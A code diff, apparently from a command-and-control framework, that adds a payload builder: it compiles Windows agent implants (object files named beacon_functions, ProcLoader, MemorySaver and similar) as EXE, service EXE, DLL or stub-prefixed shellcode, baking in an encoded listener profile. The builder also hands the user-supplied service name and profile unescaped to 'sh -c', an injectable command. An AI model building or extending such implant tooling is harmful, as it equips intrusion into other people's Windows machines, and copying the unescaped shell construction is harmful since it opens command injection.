@@ -9,6 +9,10 @@ import (
 	"fmt"
 	"hash/crc32"
 	"math/rand"
+	"os"
+	"os/exec"
+	"path/filepath"
+	"runtime"
 	"strconv"
 	"strings"
 	"time"
@@ -31,11 +35,17 @@ type GenerateConfig struct {
 	SvcName string `json:"svcname"`
 }
 
-func CreateAgentProfile(agentConfig string, listenerProfile []byte) ([]byte, error) {
+var ObjectDir = "objects"
+var ObjectFiles = [...]string{"AgentConfig", "Agent", "AgentInfo", "ApiLoader", "beacon_functions", "Boffer", "Commander", "ConnectorHTTP", "Crypt", "Downloader", "Encoders", "JobsController", "MainAgent", "MemorySaver", "Packer", "ProcLoader", "std", "utils", "WaitMask"}
+var CFlag = "-c -fno-ident -fno-stack-protector -fno-exceptions -fno-asynchronous-unwind-tables -fno-strict-overflow -fno-delete-null-pointer-checks -fpermissive -w -masm=intel -fPIC"
+var LFlags = "-Os -s -Wl,-s,--gc-sections -static-libgcc -mwindows"
+
+func AgentGenerateProfile(agentConfig string, listenerProfile []byte) ([]byte, error) {
 	var (
-		listenerMap map[string]any
-		err         error
-		params      []interface{}
+		listenerMap    map[string]any
+		generateConfig GenerateConfig
+		err            error
+		params         []interface{}
 	)
 
 	err = json.Unmarshal(listenerProfile, &listenerMap)
@@ -43,13 +53,14 @@ func CreateAgentProfile(agentConfig string, listenerProfile []byte) ([]byte, err
 		return nil, err
 	}
 
+	err = json.Unmarshal([]byte(agentConfig), &generateConfig)
+	if err != nil {
+		return nil, err
+	}
+
 	protocol, _ := listenerMap["protocol"].(string)
+
 	if protocol == "http" {
-		var generateConfig GenerateConfig
-		err = json.Unmarshal([]byte(agentConfig), &generateConfig)
-		if err != nil {
-			return nil, err
-		}
 
 		table := crc32.MakeTable(crc32.IEEE)
 		agentCrc := int(crc32.Checksum([]byte(SetName), table))
@@ -119,17 +130,129 @@ func CreateAgentProfile(agentConfig string, listenerProfile []byte) ([]byte, err
 			return nil, err
 		}
 
-		result := ""
+		profileString := ""
 		for _, b := range packedProfile {
-			result += fmt.Sprintf("\\x%02x", b)
+			profileString += fmt.Sprintf("\\x%02x", b)
 		}
-		fmt.Println(result)
 
-		//////////////////////
-
+		return []byte(profileString), nil
 	}
 
 	return nil, errors.New("protocol unknown")
+}
+
+func AgentGenerateBuild(agentConfig string, agentProfile []byte) ([]byte, string, error) {
+	var (
+		tempDir        string
+		currentDir     string
+		generateConfig GenerateConfig
+		Compiler       string
+		Ext            string
+		Files          string
+		cmdConfig      string
+		cmdBuild       string
+		stubPath       string
+		buildPath      string
+		buildContent   []byte
+		Filename       string
+		err            error
+		stdout         bytes.Buffer
+		stderr         bytes.Buffer
+	)
+
+	err = json.Unmarshal([]byte(agentConfig), &generateConfig)
+	if err != nil {
+		return nil, "", err
+	}
+
+	_, file, _, _ := runtime.Caller(0)
+	currentDir = filepath.Dir(file)
+
+	tempDir, err = os.MkdirTemp("", "ax-*")
+	if err != nil {
+		return nil, "", err
+	}
+
+	if generateConfig.Arch == "x86" {
+		Compiler = "i686-w64-mingw32-g++"
+		Ext = ".x86.o"
+		stubPath = currentDir + "/" + ObjectDir + "/stub.x86.bin"
+		Filename = "agent.x86"
+	} else {
+		Compiler = "x86_64-w64-mingw32-g++"
+		Ext = ".x64.o"
+		stubPath = currentDir + "/" + ObjectDir + "/stub.x64.bin"
+		Filename = "agent.x64"
+	}
+
+	agentProfileSize := len(agentProfile) / 4
+	cmdConfig = fmt.Sprintf("%s %s %s/config.cpp -DSERVICE_NAME='\"%s\"' -DPROFILE='\"%s\"' -DPROFILE_SIZE=%d -o %s/config.o", Compiler, CFlag, ObjectDir, generateConfig.SvcName, string(agentProfile), agentProfileSize, tempDir)
+	runnerCmdConfig := exec.Command("sh", "-c", cmdConfig)
+	runnerCmdConfig.Dir = currentDir
+	runnerCmdConfig.Stdout = &stdout
+	runnerCmdConfig.Stderr = &stderr
+	err = runnerCmdConfig.Run()
+	if err != nil {
+		os.RemoveAll(tempDir)
+		return nil, "", err
+	}
+
+	Files = tempDir + "/config.o "
+	for _, ofile := range ObjectFiles {
+		Files += ObjectDir + "/" + ofile + Ext + " "
+	}
+
+	if generateConfig.Format == "Exe" {
+		Files += ObjectDir + "/main" + Ext
+		buildPath = tempDir + "/file.exe"
+		Filename += ".exe"
+	} else if generateConfig.Format == "Service Exe" {
+		Files += ObjectDir + "/main_service" + Ext
+		buildPath = tempDir + "/svc.exe"
+		Filename = "svc_" + Filename + ".exe"
+	} else if generateConfig.Format == "DLL" {
+		Files += ObjectDir + "/main_dll" + Ext
+		LFlags += " -shared"
+		buildPath = tempDir + "/file.dll"
+		Filename += ".dll"
+	} else if generateConfig.Format == "Shellcode" {
+		Files += ObjectDir + "/main_shellcode" + Ext
+		LFlags += " -shared"
+		buildPath = tempDir + "/file.dll"
+		Filename += ".bin"
+	} else {
+		os.RemoveAll(tempDir)
+		return nil, "", errors.New("Unknown file format")
+	}
+
+	cmdBuild = fmt.Sprintf("%s %s %s -o %s", Compiler, LFlags, Files, buildPath)
+	runnerCmdBuild := exec.Command("sh", "-c", cmdBuild)
+	runnerCmdBuild.Dir = currentDir
+	runnerCmdBuild.Stdout = &stdout
+	runnerCmdBuild.Stderr = &stderr
+	err = runnerCmdBuild.Run()
+	if err != nil {
+		os.RemoveAll(tempDir)
+		return nil, "", err
+	}
+
+	buildContent, err = os.ReadFile(buildPath)
+	if err != nil {
+		return nil, "", err
+	}
+	os.RemoveAll(tempDir)
+
+	if generateConfig.Format == "Shellcode" {
+		stubContent, err := os.ReadFile(stubPath)
+		if err != nil {
+			return nil, "", err
+		}
+
+		return append(stubContent, buildContent...), Filename, nil
+
+	} else {
+		return buildContent, Filename, nil
+	}
 }
 
 func CreateAgent(initialData []byte) (AgentData, error) {
